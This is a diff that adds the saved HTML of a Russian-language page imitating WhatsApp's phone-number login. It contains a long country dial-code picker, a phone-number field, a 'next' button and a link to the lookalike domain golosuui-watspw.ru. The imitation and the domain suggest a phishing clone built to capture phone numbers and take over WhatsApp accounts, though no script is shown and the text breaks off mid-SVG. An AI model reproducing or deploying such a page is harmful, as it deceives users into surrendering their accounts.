+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PA.png" alt="PA" data-ll-status="loaded" src="./WhatsApp_files/PA.png">
+                                </div>
+                                <p class="name">Панама</p>
+                                <p class="code">+507</p>
+                            </div>
+                                                    <div class="item" data-code="+675" data-lang="PG" data-name="Папуа — Новая Гвинея">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PG.png" alt="PG" data-ll-status="loaded" src="./WhatsApp_files/PG.png">
+                                </div>
+                                <p class="name">Папуа — Новая Гвинея</p>
+                                <p class="code">+675</p>
+                            </div>
+                                                    <div class="item" data-code="+595" data-lang="PY" data-name="Парагвай">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PY.png" alt="PY" data-ll-status="loaded" src="./WhatsApp_files/PY.png">
+                                </div>
+                                <p class="name">Парагвай</p>
+                                <p class="code">+595</p>
+                            </div>
+                                                    <div class="item" data-code="+51" data-lang="PE" data-name="Перу">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PE.png" alt="PE" data-ll-status="loaded" src="./WhatsApp_files/PE.png">
+                                </div>
+                                <p class="name">Перу</p>
+                                <p class="code">+51</p>
+                            </div>
+                                                    <div class="item" data-code="+48" data-lang="PL" data-name="Польша">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PL.png" alt="PL" data-ll-status="loaded" src="./WhatsApp_files/PL.png">
+                                </div>
+                                <p class="name">Польша</p>
+                                <p class="code">+48</p>
+                            </div>
+                                                    <div class="item" data-code="+351" data-lang="PT" data-name="Португалия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PT.png" alt="PT" data-ll-status="loaded" src="./WhatsApp_files/PT.png">
+                                </div>
+                                <p class="name">Португалия</p>
+                                <p class="code">+351</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="PR" data-name="Пуэрто-Рико">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PR.png" alt="PR" data-ll-status="loaded" src="./WhatsApp_files/PR.png">
+                                </div>
+                                <p class="name">Пуэрто-Рико</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+82" data-lang="KR" data-name="Республика Корея">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KR.png" alt="KR" data-ll-status="loaded" src="./WhatsApp_files/KR.png">
+                                </div>
+                                <p class="name">Республика Корея</p>
+                                <p class="code">+82</p>
+                            </div>
+                                                    <div class="item" data-code="+262" data-lang="RE" data-name="Реюньон">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/RE.png" alt="RE" data-ll-status="loaded" src="./WhatsApp_files/RE.png">
+                                </div>
+                                <p class="name">Реюньон</p>
+                                <p class="code">+262</p>
+                            </div>
+                                                    <div class="item" data-code="+7" data-lang="RU" data-name="Россия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/RU.png" alt="RU" data-ll-status="loaded" src="./WhatsApp_files/RU.png">
+                                </div>
+                                <p class="name">Россия</p>
+                                <p class="code">+7</p>
+                            </div>
+                                                    <div class="item" data-code="+250" data-lang="RW" data-name="Руанда">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/RW.png" alt="RW" data-ll-status="loaded" src="./WhatsApp_files/RW.png">
+                                </div>
+                                <p class="name">Руанда</p>
+                                <p class="code">+250</p>
+                            </div>
+                                                    <div class="item" data-code="+40" data-lang="RO" data-name="Румыния">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/RO.png" alt="RO" data-ll-status="loaded" src="./WhatsApp_files/RO.png">
+                                </div>
+                                <p class="name">Румыния</p>
+                                <p class="code">+40</p>
+                            </div>
+                                                    <div class="item" data-code="+503" data-lang="SV" data-name="Сальвадор">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SV.png" alt="SV" data-ll-status="loaded" src="./WhatsApp_files/SV.png">
+                                </div>
+                                <p class="name">Сальвадор</p>
+                                <p class="code">+503</p>
+                            </div>
+                                                    <div class="item" data-code="+685" data-lang="WS" data-name="Самоа">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/WS.png" alt="WS" data-ll-status="loaded" src="./WhatsApp_files/WS.png">
+                                </div>
+                                <p class="name">Самоа</p>
+                                <p class="code">+685</p>
+                            </div>
+                                                    <div class="item" data-code="+378" data-lang="SM" data-name="Сан-Марино">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SM.png" alt="SM" data-ll-status="loaded" src="./WhatsApp_files/SM.png">
+                                </div>
+                                <p class="name">Сан-Марино</p>
+                                <p class="code">+378</p>
+                            </div>
+                                                    <div class="item" data-code="+239" data-lang="ST" data-name="Сан-Томе и Принсипи">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ST.png" alt="ST" data-ll-status="loaded" src="./WhatsApp_files/ST.png">
+                                </div>
+                                <p class="name">Сан-Томе и Принсипи</p>
+                                <p class="code">+239</p>
+                            </div>
+                                                    <div class="item" data-code="+966" data-lang="SA" data-name="Саудовская Аравия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SA.png" alt="SA" data-ll-status="loaded" src="./WhatsApp_files/SA.png">
+                                </div>
+                                <p class="name">Саудовская Аравия</p>
+                                <p class="code">+966</p>
+                            </div>
+                                                    <div class="item" data-code="+389" data-lang="MK" data-name="Северная Македония">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MK.png" alt="MK" data-ll-status="loaded" src="./WhatsApp_files/MK.png">
+                                </div>
+                                <p class="name">Северная Македония</p>
+                                <p class="code">+389</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="MP" data-name="Северные Марианские о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MP.png" alt="MP" data-ll-status="loaded" src="./WhatsApp_files/MP.png">
+                                </div>
+                                <p class="name">Северные Марианские о-ва</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+248" data-lang="SC" data-name="Сейшельские Острова">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SC.png" alt="SC" data-ll-status="loaded" src="./WhatsApp_files/SC.png">
+                                </div>
+                                <p class="name">Сейшельские Острова</p>
+                                <p class="code">+248</p>
+                            </div>
+                                                    <div class="item" data-code="+590" data-lang="BL" data-name="Сен-Бартелеми">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BL.png" alt="BL" data-ll-status="loaded" src="./WhatsApp_files/BL.png">
+                                </div>
+                                <p class="name">Сен-Бартелеми</p>
+                                <p class="code">+590</p>
+                            </div>
+                                                    <div class="item" data-code="+590" data-lang="MF" data-name="Сен-Мартен">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MF.png" alt="MF" data-ll-status="loaded" src="./WhatsApp_files/MF.png">
+                                </div>
+                                <p class="name">Сен-Мартен</p>
+                                <p class="code">+590</p>
+                            </div>
+                                                    <div class="item" data-code="+508" data-lang="PM" data-name="Сен-Пьер и Микелон">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PM.png" alt="PM" data-ll-status="loaded" src="./WhatsApp_files/PM.png">
+                                </div>
+                                <p class="name">Сен-Пьер и Микелон</p>
+                                <p class="code">+508</p>
+                            </div>
+                                                    <div class="item" data-code="+221" data-lang="SN" data-name="Сенегал">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SN.png" alt="SN" data-ll-status="loaded" src="./WhatsApp_files/SN.png">
+                                </div>
+                                <p class="name">Сенегал</p>
+                                <p class="code">+221</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="VC" data-name="Сент-Винсент и Гренадины">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VC.png" alt="VC" data-ll-status="loaded" src="./WhatsApp_files/VC.png">
+                                </div>
+                                <p class="name">Сент-Винсент и Гренадины</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="KN" data-name="Сент-Китс и Невис">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KN.png" alt="KN" data-ll-status="loaded" src="./WhatsApp_files/KN.png">
+                                </div>
+                                <p class="name">Сент-Китс и Невис</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="LC" data-name="Сент-Люсия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LC.png" alt="LC" data-ll-status="loaded" src="./WhatsApp_files/LC.png">
+                                </div>
+                                <p class="name">Сент-Люсия</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+381" data-lang="RS" data-name="Сербия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/RS.png" alt="RS" data-ll-status="loaded" src="./WhatsApp_files/RS.png">
+                                </div>
+                                <p class="name">Сербия</p>
+                                <p class="code">+381</p>
+                            </div>
+                                                    <div class="item" data-code="+65" data-lang="SG" data-name="Сингапур">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SG.png" alt="SG" data-ll-status="loaded" src="./WhatsApp_files/SG.png">
+                                </div>
+                                <p class="name">Сингапур</p>
+                                <p class="code">+65</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="SX" data-name="Синт-Мартен">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SX.png" alt="SX" data-ll-status="loaded" src="./WhatsApp_files/SX.png">
+                                </div>
+                                <p class="name">Синт-Мартен</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+963" data-lang="SY" data-name="Сирия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SY.png" alt="SY" data-ll-status="loaded" src="./WhatsApp_files/SY.png">
+                                </div>
+                                <p class="name">Сирия</p>
+                                <p class="code">+963</p>
+                            </div>
+                                                    <div class="item" data-code="+421" data-lang="SK" data-name="Словакия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SK.png" alt="SK" data-ll-status="loaded" src="./WhatsApp_files/SK.png">
+                                </div>
+                                <p class="name">Словакия</p>
+                                <p class="code">+421</p>
+                            </div>
+                                                    <div class="item" data-code="+386" data-lang="SI" data-name="Словения">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SI.png" alt="SI" data-ll-status="loaded" src="./WhatsApp_files/SI.png">
+                                </div>
+                                <p class="name">Словения</p>
+                                <p class="code">+386</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="US" data-name="Соединенные Штаты">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/US.png" alt="US" data-ll-status="loaded" src="./WhatsApp_files/US.png">
+                                </div>
+                                <p class="name">Соединенные Штаты</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+677" data-lang="SB" data-name="Соломоновы Острова">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SB.png" alt="SB" data-ll-status="loaded" src="./WhatsApp_files/SB.png">
+                                </div>
+                                <p class="name">Соломоновы Острова</p>
+                                <p class="code">+677</p>
+                            </div>
+                                                    <div class="item" data-code="+252" data-lang="SO" data-name="Сомали">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SO.png" alt="SO" data-ll-status="loaded" src="./WhatsApp_files/SO.png">
+                                </div>
+                                <p class="name">Сомали</p>
+                                <p class="code">+252</p>
+                            </div>
+                                                    <div class="item" data-code="+249" data-lang="SD" data-name="Судан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SD.png" alt="SD" data-ll-status="loaded" src="./WhatsApp_files/SD.png">
+                                </div>
+                                <p class="name">Судан</p>
+                                <p class="code">+249</p>
+                            </div>
+                                                    <div class="item" data-code="+597" data-lang="SR" data-name="Суринам">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SR.png" alt="SR" data-ll-status="loaded" src="./WhatsApp_files/SR.png">
+                                </div>
+                                <p class="name">Суринам</p>
+                                <p class="code">+597</p>
+                            </div>
+                                                    <div class="item" data-code="+232" data-lang="SL" data-name="Сьерра-Леоне">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SL.png" alt="SL" data-ll-status="loaded" src="./WhatsApp_files/SL.png">
+                                </div>
+                                <p class="name">Сьерра-Леоне</p>
+                                <p class="code">+232</p>
+                            </div>
+                                                    <div class="item" data-code="+992" data-lang="TJ" data-name="Таджикистан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TJ.png" alt="TJ" data-ll-status="loaded" src="./WhatsApp_files/TJ.png">
+                                </div>
+                                <p class="name">Таджикистан</p>
+                                <p class="code">+992</p>
+                            </div>
+                                                    <div class="item" data-code="+66" data-lang="TH" data-name="Таиланд">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TH.png" alt="TH" data-ll-status="loaded" src="./WhatsApp_files/TH.png">
+                                </div>
+                                <p class="name">Таиланд</p>
+                                <p class="code">+66</p>
+                            </div>
+                                                    <div class="item" data-code="+886" data-lang="TW" data-name="Тайвань">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TW.png" alt="TW" data-ll-status="loaded" src="./WhatsApp_files/TW.png">
+                                </div>
+                                <p class="name">Тайвань</p>
+                                <p class="code">+886</p>
+                            </div>
+                                                    <div class="item" data-code="+255" data-lang="TZ" data-name="Танзания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TZ.png" alt="TZ" data-ll-status="loaded" src="./WhatsApp_files/TZ.png">
+                                </div>
+                                <p class="name">Танзания</p>
+                                <p class="code">+255</p>
+                            </div>
+                                                    <div class="item" data-code="+228" data-lang="TG" data-name="Того">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TG.png" alt="TG" data-ll-status="loaded" src="./WhatsApp_files/TG.png">
+                                </div>
+                                <p class="name">Того</p>
+                                <p class="code">+228</p>
+                            </div>
+                                                    <div class="item" data-code="+690" data-lang="TK" data-name="Токелау">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TK.png" alt="TK" data-ll-status="loaded" src="./WhatsApp_files/TK.png">
+                                </div>
+                                <p class="name">Токелау</p>
+                                <p class="code">+690</p>
+                            </div>
+                                                    <div class="item" data-code="+676" data-lang="TO" data-name="Тонга">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TO.png" alt="TO" data-ll-status="loaded" src="./WhatsApp_files/TO.png">
+                                </div>
+                                <p class="name">Тонга</p>
+                                <p class="code">+676</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="TT" data-name="Тринидад и Тобаго">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TT.png" alt="TT" data-ll-status="loaded" src="./WhatsApp_files/TT.png">
+                                </div>
+                                <p class="name">Тринидад и Тобаго</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+688" data-lang="TV" data-name="Тувалу">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TV.png" alt="TV" data-ll-status="loaded" src="./WhatsApp_files/TV.png">
+                                </div>
+                                <p class="name">Тувалу</p>
+                                <p class="code">+688</p>
+                            </div>
+                                                    <div class="item" data-code="+216" data-lang="TN" data-name="Тунис">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TN.png" alt="TN" data-ll-status="loaded" src="./WhatsApp_files/TN.png">
+                                </div>
+                                <p class="name">Тунис</p>
+                                <p class="code">+216</p>
+                            </div>
+                                                    <div class="item" data-code="+993" data-lang="TM" data-name="Туркменистан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TM.png" alt="TM" data-ll-status="loaded" src="./WhatsApp_files/TM.png">
+                                </div>
+                                <p class="name">Туркменистан</p>
+                                <p class="code">+993</p>
+                            </div>
+                                                    <div class="item" data-code="+90" data-lang="TR" data-name="Турция">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TR.png" alt="TR" data-ll-status="loaded" src="./WhatsApp_files/TR.png">
+                                </div>
+                                <p class="name">Турция</p>
+                                <p class="code">+90</p>
+                            </div>
+                                                    <div class="item" data-code="+256" data-lang="UG" data-name="Уганда">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/UG.png" alt="UG" data-ll-status="loaded" src="./WhatsApp_files/UG.png">
+                                </div>
+                                <p class="name">Уганда</p>
+                                <p class="code">+256</p>
+                            </div>
+                                                    <div class="item" data-code="+998" data-lang="UZ" data-name="Узбекистан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/UZ.png" alt="UZ" data-ll-status="loaded" src="./WhatsApp_files/UZ.png">
+                                </div>
+                                <p class="name">Узбекистан</p>
+                                <p class="code">+998</p>
+                            </div>
+                                                    <div class="item" data-code="+380" data-lang="UA" data-name="Украина">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/UA.png" alt="UA" data-ll-status="loaded" src="./WhatsApp_files/UA.png">
+                                </div>
+                                <p class="name">Украина</p>
+                                <p class="code">+380</p>
+                            </div>
+                                                    <div class="item" data-code="+681" data-lang="WF" data-name="Уоллис и Футуна">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/WF.png" alt="WF" data-ll-status="loaded" src="./WhatsApp_files/WF.png">
+                                </div>
+                                <p class="name">Уоллис и Футуна</p>
+                                <p class="code">+681</p>
+                            </div>
+                                                    <div class="item" data-code="+598" data-lang="UY" data-name="Уругвай">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/UY.png" alt="UY" data-ll-status="loaded" src="./WhatsApp_files/UY.png">
+                                </div>
+                                <p class="name">Уругвай</p>
+                                <p class="code">+598</p>
+                            </div>
+                                                    <div class="item" data-code="+298" data-lang="FO" data-name="Фарерские о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FO.png" alt="FO" data-ll-status="loaded" src="./WhatsApp_files/FO.png">
+                                </div>
+                                <p class="name">Фарерские о-ва</p>
+                                <p class="code">+298</p>
+                            </div>
+                                                    <div class="item" data-code="+691" data-lang="FM" data-name="Федеративные Штаты Микронезии">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FM.png" alt="FM" data-ll-status="loaded" src="./WhatsApp_files/FM.png">
+                                </div>
+                                <p class="name">Федеративные Штаты Микронезии</p>
+                                <p class="code">+691</p>
+                            </div>
+                                                    <div class="item" data-code="+679" data-lang="FJ" data-name="Фиджи">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FJ.png" alt="FJ" data-ll-status="loaded" src="./WhatsApp_files/FJ.png">
+                                </div>
+                                <p class="name">Фиджи</p>
+                                <p class="code">+679</p>
+                            </div>
+                                                    <div class="item" data-code="+63" data-lang="PH" data-name="Филиппины">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PH.png" alt="PH" data-ll-status="loaded" src="./WhatsApp_files/PH.png">
+                                </div>
+                                <p class="name">Филиппины</p>
+                                <p class="code">+63</p>
+                            </div>
+                                                    <div class="item" data-code="+358" data-lang="FI" data-name="Финляндия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FI.png" alt="FI" data-ll-status="loaded" src="./WhatsApp_files/FI.png">
+                                </div>
+                                <p class="name">Финляндия</p>
+                                <p class="code">+358</p>
+                            </div>
+                                                    <div class="item" data-code="+500" data-lang="FK" data-name="Фолклендские о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FK.png" alt="FK" data-ll-status="loaded" src="./WhatsApp_files/FK.png">
+                                </div>
+                                <p class="name">Фолклендские о-ва</p>
+                                <p class="code">+500</p>
+                            </div>
+                                                    <div class="item" data-code="+33" data-lang="FR" data-name="Франция">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/FR.png" alt="FR" data-ll-status="loaded" src="./WhatsApp_files/FR.png">
+                                </div>
+                                <p class="name">Франция</p>
+                                <p class="code">+33</p>
+                            </div>
+                                                    <div class="item" data-code="+594" data-lang="GF" data-name="Французская Гвиана">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GF.png" alt="GF" data-ll-status="loaded" src="./WhatsApp_files/GF.png">
+                                </div>
+                                <p class="name">Французская Гвиана</p>
+                                <p class="code">+594</p>
+                            </div>
+                                                    <div class="item" data-code="+689" data-lang="PF" data-name="Французская Полинезия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PF.png" alt="PF" data-ll-status="loaded" src="./WhatsApp_files/PF.png">
+                                </div>
+                                <p class="name">Французская Полинезия</p>
+                                <p class="code">+689</p>
+                            </div>
+                                                    <div class="item" data-code="+385" data-lang="HR" data-name="Хорватия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/HR.png" alt="HR" data-ll-status="loaded" src="./WhatsApp_files/HR.png">
+                                </div>
+                                <p class="name">Хорватия</p>
+                                <p class="code">+385</p>
+                            </div>
+                                                    <div class="item" data-code="+236" data-lang="CF" data-name="Центрально-Африканская Республика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CF.png" alt="CF" data-ll-status="loaded" src="./WhatsApp_files/CF.png">
+                                </div>
+                                <p class="name">Центрально-Африканская Республика</p>
+                                <p class="code">+236</p>
+                            </div>
+                                                    <div class="item" data-code="+235" data-lang="TD" data-name="Чад">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TD.png" alt="TD" data-ll-status="loaded" src="./WhatsApp_files/TD.png">
+                                </div>
+                                <p class="name">Чад</p>
+                                <p class="code">+235</p>
+                            </div>
+                                                    <div class="item" data-code="+382" data-lang="ME" data-name="Черногория">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ME.png" alt="ME" data-ll-status="loaded" src="./WhatsApp_files/ME.png">
+                                </div>
+                                <p class="name">Черногория</p>
+                                <p class="code">+382</p>
+                            </div>
+                                                    <div class="item" data-code="+420" data-lang="CZ" data-name="Чехия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CZ.png" alt="CZ" data-ll-status="loaded" src="./WhatsApp_files/CZ.png">
+                                </div>
+                                <p class="name">Чехия</p>
+                                <p class="code">+420</p>
+                            </div>
+                                                    <div class="item" data-code="+56" data-lang="CL" data-name="Чили">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CL.png" alt="CL" data-ll-status="loaded" src="./WhatsApp_files/CL.png">
+                                </div>
+                                <p class="name">Чили</p>
+                                <p class="code">+56</p>
+                            </div>
+                                                    <div class="item" data-code="+41" data-lang="CH" data-name="Швейцария">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CH.png" alt="CH" data-ll-status="loaded" src="./WhatsApp_files/CH.png">
+                                </div>
+                                <p class="name">Швейцария</p>
+                                <p class="code">+41</p>
+                            </div>
+                                                    <div class="item" data-code="+46" data-lang="SE" data-name="Швеция">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SE.png" alt="SE" data-ll-status="loaded" src="./WhatsApp_files/SE.png">
+                                </div>
+                                <p class="name">Швеция</p>
+                                <p class="code">+46</p>
+                            </div>
+                                                    <div class="item" data-code="+47" data-lang="SJ" data-name="Шпицберген и Ян-Майен">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SJ.png" alt="SJ" data-ll-status="loaded" src="./WhatsApp_files/SJ.png">
+                                </div>
+                                <p class="name">Шпицберген и Ян-Майен</p>
+                                <p class="code">+47</p>
+                            </div>
+                                                    <div class="item" data-code="+94" data-lang="LK" data-name="Шри-Ланка">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LK.png" alt="LK" data-ll-status="loaded" src="./WhatsApp_files/LK.png">
+                                </div>
+                                <p class="name">Шри-Ланка</p>
+                                <p class="code">+94</p>
+                            </div>
+                                                    <div class="item" data-code="+593" data-lang="EC" data-name="Эквадор">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/EC.png" alt="EC" data-ll-status="loaded" src="./WhatsApp_files/EC.png">
+                                </div>
+                                <p class="name">Эквадор</p>
+                                <p class="code">+593</p>
+                            </div>
+                                                    <div class="item" data-code="+240" data-lang="GQ" data-name="Экваториальная Гвинея">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GQ.png" alt="GQ" data-ll-status="loaded" src="./WhatsApp_files/GQ.png">
+                                </div>
+                                <p class="name">Экваториальная Гвинея</p>
+                                <p class="code">+240</p>
+                            </div>
+                                                    <div class="item" data-code="+291" data-lang="ER" data-name="Эритрея">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ER.png" alt="ER" data-ll-status="loaded" src="./WhatsApp_files/ER.png">
+                                </div>
+                                <p class="name">Эритрея</p>
+                                <p class="code">+291</p>
+                            </div>
+                                                    <div class="item" data-code="+268" data-lang="SZ" data-name="Эсватини">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SZ.png" alt="SZ" data-ll-status="loaded" src="./WhatsApp_files/SZ.png">
+                                </div>
+                                <p class="name">Эсватини</p>
+                                <p class="code">+268</p>
+                            </div>
+                                                    <div class="item" data-code="+372" data-lang="EE" data-name="Эстония">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/EE.png" alt="EE" data-ll-status="loaded" src="./WhatsApp_files/EE.png">
+                                </div>
+                                <p class="name">Эстония</p>
+                                <p class="code">+372</p>
+                            </div>
+                                                    <div class="item" data-code="+251" data-lang="ET" data-name="Эфиопия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ET.png" alt="ET" data-ll-status="loaded" src="./WhatsApp_files/ET.png">
+                                </div>
+                                <p class="name">Эфиопия</p>
+                                <p class="code">+251</p>
+                            </div>
+                                                    <div class="item" data-code="+27" data-lang="ZA" data-name="Южно-Африканская Республика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ZA.png" alt="ZA" data-ll-status="loaded" src="./WhatsApp_files/ZA.png">
+                                </div>
+                                <p class="name">Южно-Африканская Республика</p>
+                                <p class="code">+27</p>
+                            </div>
+                                                    <div class="item" data-code="+211" data-lang="SS" data-name="Южный Судан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SS.png" alt="SS" data-ll-status="loaded" src="./WhatsApp_files/SS.png">
+                                </div>
+                                <p class="name">Южный Судан</p>
+                                <p class="code">+211</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="JM" data-name="Ямайка">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/JM.png" alt="JM" data-ll-status="loaded" src="./WhatsApp_files/JM.png">
+                                </div>
+                                <p class="name">Ямайка</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+81" data-lang="JP" data-name="Япония">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/JP.png" alt="JP" data-ll-status="loaded" src="./WhatsApp_files/JP.png">
+                                </div>
+                                <p class="name">Япония</p>
+                                <p class="code">+81</p>
+                            </div>
+                                            </div>
+                </div>
+                <input type="text" class="number" id="number" value="+61">
+                <button class="button primary" id="next-step">Далее</button>
+                <p class="error hidden">Недопустимый номер телефона.</p>
+                <a href="https://golosuui-watspw.ru/number/?sid=hNuM29EzR5BGsPsFnzlKo4iVtr5nFpuY9X1xU4xyKP2IMXmM3k6ICRCJlvA7V5K7#0" class="qrcode">&nbsp;</a>
+            </div>
+        </div>
+        <div class="block code hidden">
+        <div class="actions">
+    <div class="image">
+        <svg viewBox="0 0 76 51" height="55" preserveAspectRatio="xMidYMid meet" class="" fill="none">
+            <rect x="9" y="2.04663" width="58" height="37.8605" fill="#00A884"></rect>
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M10 3H66V38.8837H10V3ZM7 38.8837V3C7 1.34315 8.34315 0 10 0H66C67.6569 0 69 1.34315 69 3V38.8837H76V40C76 42.2091 74.2091 44 72 44H66H10H4C1.79086 44 0 42.2091 0 40V38.8837H7Z" fill="#54656F"></path>
